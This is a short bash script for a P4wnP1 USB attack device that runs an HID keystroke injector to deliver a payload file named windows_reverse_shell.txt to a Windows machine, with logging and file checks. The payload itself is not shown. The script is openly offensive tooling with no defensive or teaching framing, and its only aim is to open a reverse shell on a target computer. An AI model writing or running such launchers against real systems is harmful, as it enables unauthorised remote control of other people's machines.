#!/bin/bash
set -euo pipefail

# === Config ===
HID_SCRIPT="/opt/p4wnp1/payloads/hid/windows_reverse_shell.txt"
INJECTOR="/opt/p4wnp1/tools/inject_hid.sh"
LOG="/opt/p4wnp1/logs/reverse_shell_hid.log"

mkdir -p "$(dirname "$LOG")"
exec > >(tee -a "$LOG") 2>&1

echo "[*] Launching HID-based reverse shell at $(date)"

# === Sanity checks ===
if [[ ! -x "$INJECTOR" ]]; then
  echo "[!] HID injector not found at $INJECTOR"
  exit 1
fi

if [[ ! -f "$HID_SCRIPT" ]]; then
  echo "[!] HID script not found: $HID_SCRIPT"
  exit 1
fi

# === Launch injection ===
"$INJECTOR" "$HID_SCRIPT"

echo "[+] Reverse shell payload delivered over HID"
